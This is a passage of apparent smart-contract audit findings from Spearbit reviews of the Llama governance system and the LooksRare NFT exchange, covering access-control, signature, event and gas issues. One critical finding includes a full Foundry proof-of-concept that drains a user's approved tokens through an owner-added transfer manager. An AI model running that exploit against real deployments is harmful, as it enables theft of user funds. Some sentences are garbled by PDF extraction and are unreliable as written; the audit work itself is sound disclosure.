modified by the delegate_call. The slot0 contains values that should never be allowed to change. bytes32 originalStorage = _readSlot0(); (success, result) = actionInfo.target.delegatecall(actionInfo.data); if (originalStorage != _readSlot0()) revert Slot0Changed(); A script might be intended to modify certain storage slots. However, incorrect SSTORE operations can completely break the contracts. For example, setting actionsCount = type(uint).max would prevent creating any new actions, and access to funds stored in the Account would be lost.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "The execution opcode of an action can be changed from call to delegate_call after approval", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "In Llama an action only defines the target address and the function which should be called. An action doesn't implicitly define if the opcode should be a call or a delegate_call. This only depends on whether the target address is added to authorizedScripts mapping. However, adding a target to the authorizedScripts can be done after the approval in a different action. The authorizedScript action could use a different set of signers with a different approval strategy. The change of adding a target to authorizedScript should not impact actions which are already approved and in the queuing state. This could lead to security issues when policyholders approved the action under the assumption the opcode will be a call instead of a delegate call.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "LlamaFactory is governed by Llama itself", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama uses their own governance system to govern the LlamaFactory contract. The LlamaFactory contract is responsible for authorizing new LlamaStrategies. We can identify several potential drawbacks with this approach. If only a single strategy contract is used and a critical bug is discovered, the implications could be significant. In such a scenario, it would mean a broken strategy contract needs to be used by the Factory governance to deploy a fixed version of the strategy contract or enable other strategies. The likelihood for this to happen is still low but implications could be critical.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "The permissionId doesn't include call or delegate-call for LlamaAccount.execute", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The decision if LlamaAccount.execute is a delegate_call depends on the bool flag parameter withDelegatecall. This parameter is not included in the permissionId, which controls role permissions in Llama. The permissionId in Llama is calculated in the following way: PermissionData memory permission = PermissionData(target, bytes4(data), strategy); bytes32 permissionId = keccak256(abi.encode(permission)); The permissionId required for a role to perform an action only includes the function signature but not the param- eters themselves. It is impossible to define the opcode as part of the permissionId.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Nonconforming EIP-712 typehash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Incorrect strings used in computing the EIP-712 typehash. 1. The strings contain space( ) after comma(,) which is not standard EIP-712 behaviour. 2. ActionInfo is not used in typehash. There will be a mismatch when comparing to hashes produced by JS libs or solidity (if implemented), etc.. Not adhering to EIP-712 spec means wallets will not render correctly and any supporting tools will produce a different typehash.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Various events do not add the role as parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Note: During the audit, the client discovered an issue that affects their offchain infrastructure. Various events do not emit the role as parameter: 1. event ActionCreated(uint256 id, address indexed creator, ILlamaStrategy indexed strategy, address indexed target, uint256 value, bytes data, string description); 2. event ApprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason); 3. event DisapprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason);", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "LlamaCore doesn't check if minExecutionTime returned by strategy is in the past", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The minExecutionTime returned by a strategy is not validated.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Address parsing from tokenId to address string does not account for leading 0s", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Policy tokenIds are derived from the holder's account address. The address is intended to be displayed in the svg generated when calling tokenURI. Currently, leading 0s are truncated rendering the incorrect address string: e.g. 0x015b... vs 0x0000...be60 for address 0x0000000000015B23C7e20b0eA5eBd84c39dCbE60.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "The ALL_HOLDERS_ROLE can be set as a force role by mistake", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "During the initialization, an array of roles that must be assigned as force approval/disapproval can be sent. The logic does not account for ALL_HOLDERS_ROLE (which is role id 0, the default value of uint8) which can be sent as a mistake by the user. This is a low issue as if the above scenario happens, the strategy can become obsolete which will render the owner redeploy the strategy with correct initialization configs. We must mention that the force roles can not be changed after they are set within the initialization.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "LlamaPolicy.setRolePermission allows to set permissions for non existing roles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "It is possible to set a permission for a role that doesn't exist, yet. In other functions like assigning a role to a policyholder, this check happens. (See: LlamaPolicy.sol#L343) A related issue, very close to this, is the updateRoleDescription method which can emit an event for a role that does not exists. This is just an informational issue as it does not affect with anything the on-chain logic, might affect off-chain logic if any logic will ever rely on it.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "During the audit, the client discovered an issue that affects their off-chain infrastructure. The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity. From an off-chain perspective, there is currently no way to get the quantity assigned for a role to a policyholder at Role Assignment time. The event would be more useful if it emitted quantity instead of currentRoleSupply (since the latter can be just be calculated off-chain from the former).", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "ETH can remain in the contract if msg.value is greater than expected", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "When an action is created, the creator can specify an amount of ETH that needs to be sent when executing the transaction. This is necessary in order to forward ETH to a target call. Currently, when executing the action the msg.value is checked to be at least the required amount of ETH needed to be forwarded. if (msg.value < actionInfo.value) revert InsufficientMsgValue(); This can result in ETH remaining in the contract after the execution. From our point of view, LlamaCore should not hold any balance of ETH.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Cannot re-authorize an unauthorized strategy config", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Strategies are deployed using a create2 salt. The salt is derived from the strategy config itself (see LlamaCore.sol#L709-L710). This means that any unauthorized strategy cannot be used in the future, even if a user decides to re-enable it.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Signed messages may not be cancelled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Creating, approving, and disapproving actions may all be done by signing a message and having another account call the relevant *BySig function. Currently, there is no way for a signed message to be revoked without a successful *BySig function call containing the nonce of the message to be revoked.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "LlamaCore name open to squatting or impersonation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "When deploying a LlamaCore clone, the create2 salt is derived from the name. This means that no two may have the same name, and name squatting, or impersonation, may occur.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Expired policyholders are active until they are explicitly revoked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Each policyholder in Llama has an expiration timestamp. However, policyholder can still use the power of their role after the expiration has passed. The final revoke only happens after the public LlamaPolicy.revokeExpiredRole method is called. Anyone can call this method after the expiration timestamp is passed. For the Llama system to function effectively with role expiration, it is essential that external keepers vigilantly monitor the contract and promptly revoke expired roles. A final revoke exactly at the expiration can not be guaranteed.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "Gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Throughout the codebase we've identified gas improvements that were aggregated into one issue for a better management. RelativeStrategy.sol#L159  The if (disapprovalPolicySupply == 0) revert RoleHasZeroSupply(disapprovalRole); check and actionDisapprovalSupply[actionInfo.id] = disapprovalPolicySupply; can be wrapped in an if block in case disapprovals are enabled  The uint128 newNumberOfHolders; and uint128 newTotalQuantity; variables are obsolete as the up- dates on the currentRoleSupply can be done in the if branches. LlamaPolicy.sol#L380-L392  The exists check is redundant LlamaPolicy.sol#L252  The _validateActionInfoHash(action.infoHash, actionInfo); is redundant as it's already done in the getActionState LlamaCore.sol#L292 LlamaCore.sol#L280 LlamaCore.sol#L672  Finding the BOOTSTRAP_ROLE in the LlamaFactory._deploy could happen by expecting the role at a cer- tain position like position 0 instead of paying gas for an on-chain search operation to iterate the array. LlamaFactory.sol#L205  quantityDiff calculation guaranteed to not overflow as the ternary checks initialQuantity > quantity before subtracting.  Infeasible for numberOfHolders and totalQuantity to overflow. See also LlamaPolicy.sol#L422-L423  Infeasible for numberOfHolders to overflow.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Unused code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Various parts of the code is unused or unnecessary.  CallReverted and MissingAdmin in LlamaPolicy.sol#L27-L29  DisapprovalThresholdNotMet in RelativeStrategy.sol#L28  Unused errors in LlamaCore.sol InvalidCancelation, ProhibitedByActionGuard, ProhibitedByStrategy, ProhibitedByStrategy(bytes32 reason) and RoleHasZeroSupply(uint8 role)  /// - Action creators are not allowed to cast approvals or disapprovals on their own actions, The comment is inaccurate, this strategy, the creators have no restrictions on their actions. RelativeStrategy.sol#L19 17", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Duplicate storage reads and external calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "When creating, approving, disapproving, queuing, and executing actions, there are calls between the various contracts in the system. Due to the external calls, the compiler will not cache storage reads, meaning the gas cost of warm sloads is incurred multiple times. The same is true for view function calls between the contracts. A number of these calls are returning the same value multiple times in a transaction.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Consider clones-with-immutable-args", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The cloned contracts have immutable values that are written to storage on initialization due to proxies being used. Reading from storage costs extra gas but also puts some of the storage values at risk of being overwritten when making delegate calls.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "The domainSeperator may be cached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The domainSeperator is computed for each use. Some gas may be saved by using caching and deferring to the cached value.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Prefer on-chain SVGs or IPFS links over server links for contractURI", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama uses on-chain SVG for LlamaPolicy.tokenURI. The same could be implemented for LlamaPolicy.contractURI as well. In general IPFS links or on-chain SVG for visual representations provide better properties than centralized server links.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Consider making the delegate-call scripts functions only callable by delegate-call", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "An additional safety check could be added to scripts if a function should be only callable via a delegate-call.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Missing tests for SingleUseScript.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "There are no tests for SingleUseScript.sol in Llama.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Role not available to Guards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Use cases where Guards require knowing the creation or approval role for the action are not sup- ported. ActionInfo does reference the strategy, and the two implemented strategies do have public functions referencing the approvalRole, allowing for a workaround. However, this is not mandated by the ILlamaStrategy interface and is not guaranteed to be present in future strategies.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Global guards are not supported", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Other protocols use of guards applies them to the account (i.e. globally). In other words, if global guards existed and if there are some properties you know to apply to the entire LlamaCore instance a global guard could be applied. The current implementation allows granular control, but it also requires granular control with no ability to set global guards.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Consider using _disableInitializers in constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "OpenZeppelin added the _disableInitializers() in 4.6.0 which prevents initialization of the im- plementation contract and recommends its use.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Revoking and setting a role edge cases", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "This issue highlights a number of edge-case behaviors 1. Calling setRoleHolder passing in an account with balanceOf == 0, 0 quantity, and 0 expiration results in minting the NFT. 2. Revoking all policies through revokeExpiredRole leaves an address with no roles except for the ALL_- HOLDERS_ROLE and a balanceOf == 1. 3. Revoking may be conducted on policies the address does not have (building on the previous scenario):  Alice is given role 1 with expiry.  Expiry passes.  Anyone calls revokeExpiredRole.  Role is revoked but Alice still has balanceOf == 1.  LlamaCore later calls revokePolicy with roles array of [2].  A role Alice never had is revoked.  The NFT is burned.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Use built in string.concat", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The solidity version used has a built-in string.concat which can replace the instances of string(abi.encodePacked(...). The client notes there are no gas implications of this change while the change does offer semantic clarity.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Inconsistencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Throughout the codebase, we've encountered some inconsistencies that we decided to point out. for(uint256 i = 0... is not used everywhere e.g. AbsoluteStrategy.sol#L130  Sometimes, a returned value is not named. e.g. named return value function createAction( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, string memory description ) external returns (uint256 actionId) { unnamed return value function createActionBySig( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, address policyholder, uint8 v, bytes32 r, bytes32 s ) external returns (uint256) {  Missing NatSpec on various functions. e.g. LlamaPolicy.sol#L102  _uncheckedIncrement is not used everywhere.  Naming of modifiers In all contracts the onlyLlama modfiier only refers to the llamaCore. The only exception is LlamaPolicyMetadataParamRegistry which has the same name but refers to llamaCore and rootLlama but is called onlyLlama. See LlamaPolicyMetadataParamRegistry.sol#L16  Console.log debug output in RelativeStrategy console.log in RelativeStrategy See: RelativeStrat- egy.sol#L215  In GovernanceScript.sol both of SetRolePermission and SetRoleHolder mirror structs defined in the shared lib/Structs.sol file. Additionally, some contracts declare their own structs over inheriting all structs from lib/Structs.sol:  LlamaAccount  GovernanceScript  LlamaPolicy Recommend removing duplicate structs and, where relevant, continue making use of the shared Structs.sol for struct definitions.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Policyholders with large quantities may not both create and exercise their large quantity for the same action", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The AbsoluteStrategy removes the action creator from the set of policyholders who may approve / disapprove an action. This is a departure from how the RelativeStrategy handles action creators. Not permitting action creators to approve / disapprove is simple to reason about when each policyholder has a quantity of 1; creating can even be thought of an implicit approval and may be factored in when choosing a minApprovals value. However, in scenarios where a policyholder has a large quantity (in effect a large weight to their casted approval), creating an action means they forfeit the use of the vast majority of their quantity for that particular action.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "The roleBalanceCheckpoints can run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The roleBalanceCheckpoints function returns the Checkpoints history of a balance. This check will copy into memory the whole history which can end up in a out of gas error. This is an informational issue as this function was designed for off-chain usage and the caller can use eth_call with a higher gas limit.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "GovernanceScript.revokeExpiredRoles should be avoided in favor of calling LlamaPol- icy.revokeExpiredRole from EOA", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "GovernanceScript.revokeExpiredRoles is intended to be delagate called from LlamaCore. Given that LlamaPolicy.revokeExpiredRole is already public and without access controls, it will always be cheaper, and less complex, to call directly from an EOA or batching a multicall, again from an EOA.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "The InvalidActionState can be improved", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Currently, the InvalidActionState includes the expected state as an argument, this is unnecessary as you can derive the state from the method call, would make more sense to take the current state instead of the expected state.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "_uncheckedIncrement function written in multiple contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Multiple contracts make use of an _uncheckedIncrementfunction and each duplicates the function definition. Similarly the slot0 function appears in both LlamaAccount and LlamaCore and _toUint64 appears in the two strategy contracts plus LlamaCore.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "The Protocol owner can drain users' currency tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free. The owner can drain the funds as follows: 1. Calls addTransferManagerForAssetType and assigns the currency token as the transferManagerForAs- setType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType. 2. Signs an almost empty MakerAsk order and sets its collection as the address of the targeted user and the assetType to the newly created assetType. The owner also creates the corresponding TakerBid by setting the recipient field to the amount of currency they would like to transfer. 3. Calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate. // file: test/foundry/Attack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; contract NullStrategy is IBaseStrategy { function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function executeNull( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external pure returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) {} } 5 contract AttackTest is ProtocolBase { NullStrategy private nullStrategy; MockERC20 private mockERC20; uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); looksRareProtocol.initiateOwnershipTransfer(signingOwner); // This particular strategy is not a requirement of the exploit. nullStrategy = new NullStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, NullStrategy.executeNull.selector, false, address(nullStrategy) ); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); vm.stopPrank(); vm.prank(signingOwner); looksRareProtocol.confirmOwnershipTransfer(); } function testDrain() public { vm.prank(victimUser); mockERC20.approve(address(looksRareProtocol), 1000); vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(mockERC20), mockERC20.transferFrom.selector ); OrderStructs.MakerAsk memory makerAsk = _createSingleItemMakerAskOrder({ // null strategy askNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // ERC20 asset! orderNonce: 0, collection: victimUser, // <--- will be used as the `from` currency: address(0), signer: signingOwner, minPrice: 0, itemId: 1 }); 6 bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK); OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid( address(1000), // `amount` field for the `transferFrom` 0, makerAsk.itemIds, makerAsk.amounts, bytes(\"\") ); looksRareProtocol.executeTakerBid( takerBid, makerAsk, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); vm.stopPrank(); assertEq(mockERC20.balanceOf(signingOwner), 1000); assertEq(mockERC20.balanceOf(victimUser), 0); } }", "labels": ["Spearbit", "LooksRare", "Severity: Critical Risk"]}, {"title": "StrategyFloorFromChainlink will often revert due to stale prices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The FloorFromChainlink strategy inherits from BaseStrategyChainlinkPriceLatency, so it can have a maxLatency of at most 3600 seconds. However, all of the chainlink mainnet floor price feeds have a heartbeat of 86400 seconds (24 hours), so the chainlink strategies will revert with the PriceNotRecentEnough error quite often. At the time of writing, every single mainnet floor price feed has an updateAt timestamp well over 3600 seconds in the past, meaning the strategy would always revert for any mainnet price feed right now. This may have not been realized earlier because the Goerli floor price feeds do have a heartbeat of 3600, but the mainnet heartbeat is much less frequent. One of the consequences is that users might miss out on exchanges they would have accepted. For example, if a taker bid is interested in a maker ask with an eth premium from the floor, in the likely scenario where the taker didn't log-in within 1 hour of the last oracle update, the strategy will revert and the exchange won't happen even though both parties are willing. If the floor moves up again the taker might not be interested anymore. The maker will have lost out on making a premium from the floor, and the taker would have lost out on the exchange they were willing to make.", "labels": ["Spearbit", "LooksRare", "Severity: Medium Risk"]}, {"title": "minPrice and maxPrice should reflect the allowed regions for the funds to be transferred from the bidder to the ask recipient", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "1. When a maker or taker sets a minPrice for an ask, the protocol should guarantee the funds they receive is at minimum the minPrice amount (currently not enforced). 2. Also reversely, when a maker or taker sets a maxPrice for a bid, the protocol should guarantee that the amount they spend is at maximum maxPrice (currently enforced). For 1. the current protocol-controlled deviation can be 30% maximum (sum of fees sent to the creator, the protocol fee recipient, and an affiliate).", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "StrategyItemIdsRange does not invalidate makerBid.amounts[0] == 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyItemIdsRange does not check whether makerBid.amounts[0] is zero or not. If it was 0, the taker can provide empty itemIds and amounts which will cause the for loop to be skipped. The check below will also be successful since both amounts are 0: if (totalOfferedAmount != desiredAmount) { revert OrderInvalid(); } Depending on the used implementation of a transfer manager for the asset type used in this order, we might end up with the taker taking funds from the maker without providing any NFT tokens. The current implementation of TransferManager does check whether the provided itemIds have length 0 and it would revert in that case. One difference between this strategy and others are that all strategies including this one do check to revert if an amount for a specific itemId is 0 (and some of them have loops but the length of those loops depends on the parameters from the maker which enforce the loop to run at least once), but for this strategy if no itemIds are provided by the taker, the loop is skipped and one does not check whether the aggregated amount is 0 or not.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "TransferManager's owner can block token transfers for LooksRareProtocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In general, a deployed TransferManager ( T ) and a deployed LooksRareProtocol ( L ) might have two different owners ( OT , OL ). Assume TransferManager is used for asset types 0 and 1 (ERC721, ERC1155) in LooksRareProtocol and Trans- ferManager has marked the LooksRareProtocol as an allowed operator. At any point, OT can call removeOpera- tor to block L from calling T . If that happens, OL would need to add new (virtual) asset types (not 0 or 1) and the corresponding transfer managers for them. Makers would need to resign their orders with new asset types. Moreover, if LooksRare for the following issue \"The Protocol owner can drain users' currency tokens\" applies their solution through PR 308 which removes the ability of OL to add new asset types, then the whole protocol would need to be redeployed, since all order executions would revert.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "transferItemsERC721 and transferBatchItemsAcrossCollections in TransferManager do not check whether an amount == 1 for an ERC721 token. If an operator (approved by a user) sends a 0 amount for an itemId in the context of transferring ERC721 token, TransferManager would perform those transfers, even though the logic in the operator might have meant to avoid those transfers.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "The maker cannot enforce the number of times a specific order can be fulfilled for custom strategies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a maker signs an order with a specific strategy it leaves it up to the strategy to decide how many times this specific order can be fulfilled. The strategy's logic on how to decide on the returned isNonceIn- validated value, can be a complex logic in general that might be prone to errors (or have backdoors). The maker should be able to directly enforce at least an upper bound for the maximum number of fulfills for an order to avoid unexpected expenditure.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "A strategy can potentially reduce the value of a token before it gets transferred to a maker when a taker calls executeTakerAsk", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When executeTakerAsk is called by a taker a (signed by maker) strategy will be called: (bool status, bytes memory data) = strategyInfo[makerBid.strategyId].implementation.call( abi.encodeWithSelector(strategyInfo[makerBid.strategyId].selector, takerAsk, makerBid) ); Note that this is a stateful call. This call is performed before the NFT token is transferred to the maker (signer). Even though the strategy is fixed by the maker (since the stratgeyId has been signed), the strategy's implementation might involve a complex logic that might allow (if the strategy colludes with the taker somehow) a derivative token (that is owned by / linked to the to-be-transferred token) to be reattached to another token (think of accessories for an NFT character token in a game). And so the value of the to-be-transferred token would be reduced in that sense. A maker would not be able to check for this linked derivative token ownership during the transaction since there is no post-transfer hook for the maker (except in one special case when the token involved is ERC1155 and the maker is a custom contract). Also, note that all the implemented strategies would not alter the state when they are called (their endpoints have a pure or a view visibility). There is an exception to this in the StrategyTestMultiFillCollectionOrder test contract.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "An added transfer manager cannot get deactivated from the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Once a transfer manager for an asset type gets added to the protocol either through the constructor or through addTransferManagerForAssetType, if at some point there is a malicious behavior involved with the transfer manager, there is no mechanism for the protocol's owner to deactivate the transfer manager (similar to how strategies can be deactivated). If TransferManager is used for an asset type, on the TransferManager side the owner can break the link between the operator (the LooksRare protocol potentially) and the TransferManager but not the other way around.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Temporary DoS is possible in case orders are using tokens with blacklists", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the process of settling orders, _transferFungibleTokens is being called at max 4 times. In case one of these calls fails the entire transaction fails. It can only fail when an ERC20 token is used for the trade but since contracts are whitelisted in the system and probably vetted by the team, it's safe to say it's less probable that the receiver will have the ability to revert the entire transaction, although it is possible for contracts that implement a transferAndCall pattern. However, there's still the issue of transactions being reverted due to blacklistings (which have become more popular in the last year). In order to better assess the risk let's elaborate more on the 4 potential recipients of a transaction: 1. affiliate - The risk can be easily mitigated by proper handling at the front-end level. If the transaction fails due to the affiliate's address, the taker can specify address(0) as the affiliate. 2. recipient - If the transaction fails due to the recipient's address, it can only impact the taker in a gas-griefing way. 3. protocol - If the transaction fails due to the protocol's address, its address might be updated by the contract owner in the worst case. 4. creator - If the transaction fails due to the creator's address it can not be changed directly, but in the worst case creatorFeeManager can be changed.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "viewCreatorFeeInfo's reversion depends on order of successful calls to collection.royaltyInfo", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The outcome of the call to viewCreatorFeeInfo for both CreatorFeeManagerWithRebates and Cre- atorFeeManagerWithRoyalties is dependent on the order of itemIds. Assume, we have 2 itemIds with the following properties:  itemId x where the call to collection.royaltyInfo(x, price) is successful (status == 1) and returns (a, ...) where a 6= 0.  itemId y where the call to collection.royaltyInfo(y, price) fails (status == 0) Then if itemIds provided to viewCreatorFeeInfo is:  [x, y], the call to viewCreatorFeeInfo returns successfully as the outcome for y will be ignored/skipped.  [y, x], the call to viewCreatorFeeInfo reverts with BundleEIP2981NotAllowed(collection), since the first item will be skipped and so the initial value for creator will not be set and remains address(0), but when we process the loop for x, we end up comparing a with address(0) which causes the revert.", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "CreatorFeeManagerWithRebates.viewCreatorFeeInfo reversion is dependent on the order of itemIds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Assume there is an itemId x where collection.royaltyInfo(x, price) returns (0, _) and an- other itemId y where collection.royaltyInfo(y, price) returns (a, _) where a 6= 0. the itemIds array provided to CreatorFeeManagerWithRebates.viewCreatorFeeInfo is [x, y, the call would revert with the return parameters would be (address(0), 0) and [y, x, ...], Then if ...], BundleEIP2981NotAllowed(collection).", "labels": ["Spearbit", "LooksRare", "Severity: Low Risk"]}, {"title": "Seller might get a lower fee than expected due to front-running", "html_url": 